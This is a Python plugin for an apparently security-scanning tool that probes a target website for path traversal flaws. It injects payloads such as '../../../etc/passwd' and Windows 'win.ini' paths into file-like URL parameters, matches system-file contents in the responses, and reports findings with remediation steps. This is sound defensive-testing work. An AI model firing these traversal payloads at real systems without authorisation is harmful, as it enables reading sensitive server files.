"""Path Traversal detection."""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING, AsyncIterator
from urllib.parse import urlparse, parse_qs

from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Finding, Severity

if TYPE_CHECKING:
    from marlonthebug.core.workspace import Workspace, TargetInfo

logger = logging.getLogger("marlonthebug.plugins.web.path_traversal")

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "c:\\windows\\win.ini",
]

LINUX_FILE_INDICATORS = [
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:",
    "bin:x:2:2:bin:/bin:",
]

WINDOWS_FILE_INDICATORS = [
    "[fonts]",
    "[extensions]",
    "[files]",
    "[mci extensions]",
]

FILE_PARAMS = ["file", "path", "dir", "folder", "document", "include", "page", "template", "view", "load"]


class PathTraversalAuditor(BasePlugin):
    name = "path_traversal"
    version = "1.0.0"
    description = "Detect path traversal vulnerabilities by accessing sensitive system files"
    category = "web"

    async def setup(self, workspace: Workspace) -> None:
        self._workspace = workspace

    async def run(self, target: TargetInfo, options: dict | None = None) -> AsyncIterator[Finding]:
        http = AsyncHTTPClient(timeout=10, retries=1)
        try:
            for scheme in ["https", "http"]:
                try:
                    resp = await http.get(f"{scheme}://{target.host}")
                    base_url = f"{scheme}://{target.host}"
                    break
                except Exception:
                    continue
            else:
                return

            from bs4 import BeautifulSoup
            from urllib.parse import urljoin

            soup = BeautifulSoup(resp.body, "lxml")
            test_urls: set[str] = set()

            for a in soup.find_all("a", href=True):
                href = urljoin(base_url, a["href"])
                parsed = urlparse(href)
                if parsed.netloc in (target.host, f"www.{target.host}"):
                    test_urls.add(href)

            for fp in FILE_PARAMS:
                test_urls.add(f"{base_url}?{fp}=test")

            for url in list(test_urls)[:15]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                for param_name in list(params.keys())[:10]:
                    param_lower = param_name.lower()
                    is_file_param = any(fp in param_lower for fp in FILE_PARAMS)

                    if not is_file_param:
                        continue

                    for payload in PATH_TRAVERSAL_PAYLOADS:
                        try:
                            test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                            test_params[param_name] = payload
                            query_str = "&".join(f"{k}={v}" for k, v in test_params.items())
                            test_url = parsed._replace(query=query_str).geturl()
                            response = await http.get(test_url)

                            for indicator in LINUX_FILE_INDICATORS:
                                if indicator in response.body:
                                    yield self.create_finding(
                                        title=f"Path Traversal in '{param_name}' (Linux)",
                                        description=f"Path traversal vulnerability in '{param_name}' allows reading /etc/passwd.",
                                        severity=Severity.CRITICAL,
                                        cvss_score=9.0,
                                        endpoint=url,
                                        target_host=target.host,
                                        evidence={"parameter": param_name, "payload": payload,
                                                   "indicator": indicator, "response_snippet": response.body[:300]},
                                        remediation=(
                                            "1. Use chroot or containerization\n"
                                            "2. Resolve paths to canonical form and validate against allowlist\n"
                                            "3. Strip or reject '..' sequences\n"
                                            "4. Serve files via indirect references (IDs instead of paths)\n"
                                            "5. Run application with minimal file system permissions"
                                        ),
                                    )
                                    break

                            for indicator in WINDOWS_FILE_INDICATORS:
                                if indicator in response.body:
                                    yield self.create_finding(
                                        title=f"Path Traversal in '{param_name}' (Windows)",
                                        description=f"Path traversal vulnerability in '{param_name}' allows reading Windows system files.",
                                        severity=Severity.CRITICAL,
                                        cvss_score=9.0,
                                        endpoint=url,
                                        target_host=target.host,
                                        evidence={"parameter": param_name, "payload": payload,
                                                   "response_snippet": response.body[:300]},
                                    )
                                    break
                        except Exception:
                            pass
        finally:
            await http.close()
